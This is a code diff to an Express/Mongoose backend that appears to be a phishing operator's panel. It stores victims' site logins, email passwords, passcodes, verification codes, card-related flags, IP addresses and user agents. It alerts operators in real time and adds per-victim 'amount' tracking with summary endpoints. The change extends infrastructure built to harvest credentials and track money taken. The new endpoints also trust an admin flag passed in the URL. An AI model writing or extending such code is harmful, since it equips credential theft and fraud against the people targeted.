@@ -302,7 +302,7 @@ export const info_get = async (req, res) => {
             path: "details",
             model: "Info",
             select:
-              "site email password skipcode mail mailPass onlyCard holdingCard",
+              "site email password skipcode mail mailPass onlyCard holdingCard amount",
           },
         })
         .select("posters")
@@ -315,7 +315,7 @@ export const info_get = async (req, res) => {
       .select("details")
       .populate(
         "details",
-        "site email password gCode skipcode mail mailPass onlyCard holdingCard",
+        "site email password gCode skipcode mail mailPass onlyCard holdingCard amount",
       )
       .sort({ createdAt: -1 });
     return res.status(200).json({ poster: poster });
@@ -403,7 +403,7 @@ export const add_data = async (req, res) => {
   });
 
   const { adminId, posterId } = req.params;
-  const { site, mail, passcode, email, password } = req.body;
+  const { site, mail, passcode, email, password, amount } = req.body;
   const userAgent = req.headers["user-agent"];
   const ipAddress = (
     req.headers["x-forwarded-for"] ||
@@ -424,12 +424,21 @@ export const add_data = async (req, res) => {
         passcode,
         email,
         password,
+        amount,
         adminId: adminId,
         poster: posterId,
         root: posterFound._id,
         ip: ipAddress,
         agent: userAgent,
       });
+
+      if (amount) {
+        await Amount.findOneAndUpdate(
+          { site: site, adminId: adminId, posterId: posterId },
+          { amount: amount },
+          { new: true, upsert: true }
+        );
+      }
 
       await info.save();
       if (info) {
@@ -618,7 +627,7 @@ export const poster_details = async (req, res) => {
 
     const details = await Info.find({ root: id })
       .select(
-        "site mail passcode skipcode email password tag gCode ip agent status number createdAt ",
+        "site mail passcode skipcode email password tag gCode ip agent status number createdAt amount ",
       )
       .sort({ createdAt: -1 });
     // const newdata = {...poster, details: details }
@@ -922,7 +931,7 @@ export const add_data_simplified = async (req, res) => {
   });
 
   const { adminId } = req.params;
-  const { site, mail, passcode, email, password } = req.body;
+  const { site, mail, passcode, email, password, amount } = req.body;
   const userAgent = req.headers["user-agent"];
   const ipAddress = (
     req.headers["x-forwarded-for"] ||
@@ -945,10 +954,19 @@ export const add_data_simplified = async (req, res) => {
         passcode,
         email,
         password,
+        amount,
         adminId: userFound.adminId || userFound.username,
         ip: ipAddress,
         agent: userAgent,
       });
+
+      if (amount) {
+        await Amount.findOneAndUpdate(
+          { site: site, adminId: userFound.adminId || userFound.username },
+          { amount: amount },
+          { new: true, upsert: true }
+        );
+      }
 
       await info.save();
       pusher.trigger(
@@ -1719,6 +1737,53 @@ export const dynamic_link_delete = async (req, res) => {
   try {
     await Link.findByIdAndDelete(id);
     return res.status(200).json({ success: true });
+  } catch (e) {
+    return res.status(400).json({ error: e.message });
+  }
+};
+
+export const get_amount_summary = async (req, res) => {
+  const { id, admin } = req.params;
+  const isAdmin = admin === "true" || admin === true;
+
+  try {
+    let query = {};
+    if (!isAdmin) {
+      query = { poster: id };
+    }
+
+    const infos = await Info.find(query).select("amount");
+    let total = 0;
+    infos.forEach((info) => {
+      if (info.amount) {
+        const val = parseFloat(info.amount);
+        if (!isNaN(val)) {
+          total += val;
+        }
+      }
+    });
+
+    return res.status(200).json({ total });
+  } catch (e) {
+    return res.status(400).json({ error: e.message });
+  }
+};
+
+export const get_amount_list = async (req, res) => {
+  const { id, admin } = req.params;
+  const isAdmin = admin === "true" || admin === true;
+
+  try {
+    let query = {};
+    if (!isAdmin) {
+      query = { poster: id };
+    }
+
+    const infos = await Info.find(query)
+      .select("site email amount createdAt adminId poster")
+      .sort({ createdAt: -1 });
+
+    return res.status(200).json({ success: true, data: infos });
   } catch (e) {
     return res.status(400).json({ error: e.message });
   }
